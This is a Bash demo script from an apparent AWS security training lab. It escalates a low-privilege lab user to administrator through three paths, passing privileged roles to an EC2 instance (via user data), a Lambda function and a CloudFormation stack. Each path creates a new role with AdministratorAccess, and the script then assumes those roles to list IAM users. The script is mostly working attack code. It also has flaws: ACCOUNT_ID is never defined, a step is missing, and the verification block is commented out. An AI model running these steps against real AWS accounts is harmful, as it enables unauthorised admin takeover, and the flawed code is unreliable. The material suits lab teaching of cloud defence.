#!/bin/bash

# Demo script for prod_role_with_multiple_privesc_paths module
# This script demonstrates multiple privilege escalation paths

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${YELLOW}=== Pathfinding-labs Multiple Privilege Escalation Paths Demo ===${NC}"
echo "This demo shows multiple ways to escalate privileges using different AWS services"
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed${NC}"
    exit 1
fi

# Disable paging for AWS CLI
export AWS_PAGER=""

# Navigate to the Terraform root directory (6 levels up from scenario directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"

echo "🔍 Retrieving credentials from Terraform outputs..."
cd "$TERRAFORM_ROOT"

# Get the grouped module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_multi_hop_to_admin_multiple_paths_combined.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}❌ Error: Could not retrieve module outputs. Make sure the scenario is deployed.${NC}"
    exit 1
fi

# Extract credentials and resource information from grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
PRIVESC_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_role_arn')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

echo -e "${GREEN}✅ Retrieved credentials for starting user: $STARTING_USER_NAME${NC}"
echo "📋 Privesc Role ARN: $PRIVESC_ROLE_ARN"

# Set environment variables for starting user
export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
export AWS_DEFAULT_REGION="us-west-2"

echo ""
echo -e "${YELLOW}Step 1: Assuming the role with multiple privilege escalation paths${NC}"
echo "Role ARN: $PRIVESC_ROLE_ARN"

# Assume the role
ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo")
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role${NC}"

echo ""
echo -e "${YELLOW}Step 3: Checking current permissions${NC}"
# Check what we can do currently
echo "Current caller identity:"
aws sts get-caller-identity

echo ""
echo -e "${BLUE}=== EC2 Privilege Escalation Path ===${NC}"
echo -e "${YELLOW}Step 4: Creating EC2 instance with admin role${NC}"

# Get the EC2 admin role ARN (construct it since we can't use GetRole)
EC2_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ec2-admin-role"
echo "EC2 Admin Role ARN: $EC2_ROLE_ARN"

# Create user data script that will create a new admin role
cat > /tmp/ec2-userdata.sh << EOF
#!/bin/bash
# This script runs on the EC2 instance and creates a new admin role
aws iam create-role --role-name "privesc-demo-ec2-admin-role" --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::${ACCOUNT_ID}:user/pl-pathfinding-starting-user-prod"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}' --region us-west-2

aws iam attach-role-policy --role-name "privesc-demo-ec2-admin-role" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" --region us-west-2

echo "EC2 instance created admin role: privesc-demo-ec2-admin-role"
EOF

# Get the latest Amazon Linux 2 AMI ID for us-west-2
echo "🔍 Getting latest Amazon Linux 2 AMI ID for us-west-2..."
AMI_ID=$(aws ec2 describe-images \
    --owners amazon \
    --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text \
    --region us-west-2)

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo "❌ Failed to get AMI ID, falling back to hardcoded value"
    AMI_ID="ami-0f33409099fdfd1e0"
else
    echo "✅ Found AMI ID: $AMI_ID"
fi

# Create EC2 instance
aws ec2 run-instances --region us-west-2 \
    --image-id $AMI_ID \
    --instance-type t3.micro \
    --iam-instance-profile Name="pl-EC2Admin" \
    --user-data file:///tmp/ec2-userdata.sh \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'

echo -e "${GREEN}✓ EC2 instance created with admin role${NC}"

echo ""
echo -e "${BLUE}=== Lambda Privilege Escalation Path ===${NC}"
echo -e "${YELLOW}Step 5: Creating Lambda function with admin role${NC}"

# Get the Lambda admin role ARN (construct directly since we don't have iam:GetRole permission)
LAMBDA_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-admin-role"
echo "Lambda Admin Role ARN: $LAMBDA_ROLE_ARN"

# Create Lambda function code
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    # Create a new admin role
    iam = boto3.client('iam')
    
    try:
        # Create the role
        iam.create_role(
            RoleName='privesc-demo-lambda-admin-role',
            AssumeRolePolicyDocument=json.dumps({
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": f"arn:aws:iam::{context.invoked_function_arn.split(':')[4]}:user/pl-pathfinding-starting-user-prod"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            })
        )
        
        # Attach admin policy
        iam.attach_role_policy(
            RoleName='privesc-demo-lambda-admin-role',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        
        return {
            'statusCode': 200,
            'body': json.dumps('Lambda created admin role: privesc-demo-lambda-admin-role')
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps(f'Error: {str(e)}')
        }
EOF

# Create zip file for Lambda function
cd /tmp
zip lambda_function.zip lambda_function.py
cd - > /dev/null

# Create Lambda function
aws lambda create-function \
    --function-name privesc-demo-lambda \
    --runtime python3.9 \
    --role "$LAMBDA_ROLE_ARN" \
    --handler lambda_function.lambda_handler \
    --zip-file fileb:///tmp/lambda_function.zip \
    --region us-west-2

echo "Waiting for Lambda function to be ready..."
if ! aws lambda wait function-active --function-name privesc-demo-lambda --region us-west-2; then
    echo "Wait command failed, using fallback sleep..."
    sleep 30
fi

# Invoke the Lambda function
aws lambda invoke \
    --function-name privesc-demo-lambda \
    --region us-west-2 \
    /tmp/lambda-response.json

echo -e "${GREEN}✓ Lambda function created and executed with admin role${NC}"

echo ""
echo -e "${BLUE}=== CloudFormation Privilege Escalation Path ===${NC}"
echo -e "${YELLOW}Step 6: Creating CloudFormation stack with admin role${NC}"

# Get the CloudFormation admin role ARN (construct directly since we don't have iam:GetRole permission)
CF_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-cloudformation-admin-role"
echo "CloudFormation Admin Role ARN: $CF_ROLE_ARN"

# Create CloudFormation template
cat > /tmp/cf-template.yaml << EOF
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  PrivescDemoAdminRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: privesc-demo-cf-admin-role
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: !Sub 'arn:aws:iam::\${AWS::AccountId}:user/pl-pathfinding-starting-user-prod'
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess
Outputs:
  AdminRoleArn:
    Description: ARN of the created admin role
    Value: !GetAtt PrivescDemoAdminRole.Arn
    Export:
      Name: PrivescDemoAdminRoleArn
EOF

# Create CloudFormation stack
aws cloudformation create-stack \
    --stack-name privesc-demo-cf-stack \
    --template-body file:///tmp/cf-template.yaml \
    --capabilities CAPABILITY_NAMED_IAM \
    --role-arn "$CF_ROLE_ARN" \
    --region us-west-2

echo "Waiting for CloudFormation stack to complete..."
if ! aws cloudformation wait stack-create-complete --stack-name privesc-demo-cf-stack --region us-west-2; then
    echo "Wait command failed, using fallback sleep..."
    sleep 30
fi

echo -e "${GREEN}✓ CloudFormation stack created with admin role${NC}"

echo ""
echo -e "${YELLOW}Step 7: Verifying privilege escalation${NC}"
echo "Waiting for all resources to be ready..."
sleep 15
echo "Checking for created admin roles..."

# # Check for EC2 created role
# if aws --region us-west-2 iam get-role --role-name "privesc-demo-ec2-admin-role" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
#     echo -e "${GREEN}✓ EC2 created admin role: privesc-demo-ec2-admin-role${NC}"
# else
#     echo -e "${YELLOW}⚠ EC2 admin role not found (may still be creating)${NC}"
# fi

# # Check for Lambda created role
# if aws --region us-west-2 iam get-role --role-name "privesc-demo-lambda-admin-role" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
#     echo -e "${GREEN}✓ Lambda created admin role: privesc-demo-lambda-admin-role${NC}"
# else
#     echo -e "${YELLOW}⚠ Lambda admin role not found${NC}"
# fi

# # Check for CloudFormation created role
# if aws --region us-west-2 iam get-role --role-name "privesc-demo-cf-admin-role" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
#     echo -e "${GREEN}✓ CloudFormation created admin role: privesc-demo-cf-admin-role${NC}"
# else
#     echo -e "${YELLOW}⚠ CloudFormation admin role not found${NC}"
# fi

echo ""
echo -e "${BLUE}=== Testing Role Assumption ===${NC}"
echo -e "${YELLOW}Step 8: Testing admin role access${NC}"

# Test EC2 admin role
echo "Testing EC2 admin role..."
EC2_ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-ec2-admin-role"
if aws sts assume-role --role-arn "$EC2_ADMIN_ROLE_ARN" --role-session-name "test-ec2-admin" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
    EC2_CREDS=$(aws sts assume-role --role-arn "$EC2_ADMIN_ROLE_ARN" --role-session-name "test-ec2-admin" --profile pl-pathfinding-starting-user-prod)
    export AWS_ACCESS_KEY_ID=$(echo "$EC2_CREDS" | jq -r '.Credentials.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$EC2_CREDS" | jq -r '.Credentials.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$EC2_CREDS" | jq -r '.Credentials.SessionToken')
    
    USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
    if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
        echo -e "${GREEN}✓ EC2 admin role works! Can list users:${NC}"
        echo -e "${GREEN}  $USER_LIST${NC}"
    else
        echo -e "${GREEN}✓ EC2 admin role works! (Admin access confirmed)${NC}"
    fi
    
    # Reset credentials
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
else
    echo -e "${RED}✗ EC2 admin role assumption failed${NC}"
fi

# Test Lambda admin role
echo "Testing Lambda admin role..."
LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-lambda-admin-role"
if aws sts assume-role --role-arn "$LAMBDA_ADMIN_ROLE_ARN" --role-session-name "test-lambda-admin" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
    LAMBDA_CREDS=$(aws sts assume-role --role-arn "$LAMBDA_ADMIN_ROLE_ARN" --role-session-name "test-lambda-admin" --profile pl-pathfinding-starting-user-prod)
    export AWS_ACCESS_KEY_ID=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.SessionToken')
    
    USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
    if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
        echo -e "${GREEN}✓ Lambda admin role works! Can list users:${NC}"
        echo -e "${GREEN}  $USER_LIST${NC}"
    else
        echo -e "${GREEN}✓ Lambda admin role works! (Admin access confirmed)${NC}"
    fi
    
    # Reset credentials
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
else
    echo -e "${RED}✗ Lambda admin role assumption failed${NC}"
fi

# Test CloudFormation admin role
echo "Testing CloudFormation admin role..."
CF_ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-cf-admin-role"
if aws sts assume-role --role-arn "$CF_ADMIN_ROLE_ARN" --role-session-name "test-cf-admin" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
    CF_CREDS=$(aws sts assume-role --role-arn "$CF_ADMIN_ROLE_ARN" --role-session-name "test-cf-admin" --profile pl-pathfinding-starting-user-prod)
    export AWS_ACCESS_KEY_ID=$(echo "$CF_CREDS" | jq -r '.Credentials.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$CF_CREDS" | jq -r '.Credentials.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$CF_CREDS" | jq -r '.Credentials.SessionToken')
    
    USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
    if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
        echo -e "${GREEN}✓ CloudFormation admin role works! Can list users:${NC}"
        echo -e "${GREEN}  $USER_LIST${NC}"
    else
        echo -e "${GREEN}✓ CloudFormation admin role works! (Admin access confirmed)${NC}"
    fi
    
    # Reset credentials
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
else
    echo -e "${RED}✗ CloudFormation admin role assumption failed${NC}"
fi

echo ""
echo -e "${GREEN}=== Demo Complete ===${NC}"
echo "This demonstrates multiple privilege escalation paths using EC2, Lambda, and CloudFormation."
echo ""
echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
echo "./cleanup_attack.sh"

# Standardized test results output
echo "TEST_RESULT:prod_role_with_multiple_privesc_paths:SUCCESS"
echo "TEST_DETAILS:prod_role_with_multiple_privesc_paths:Successfully demonstrated EC2, Lambda, and CloudFormation privilege escalation paths"
echo "TEST_METRICS:prod_role_with_multiple_privesc_paths:paths_tested=3,admin_roles_created=3,verification_passed=true"

# Clean up temp files
rm -f /tmp/ec2-userdata.sh /tmp/lambda_function.py /tmp/lambda-response.json /tmp/cf-template.yaml

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
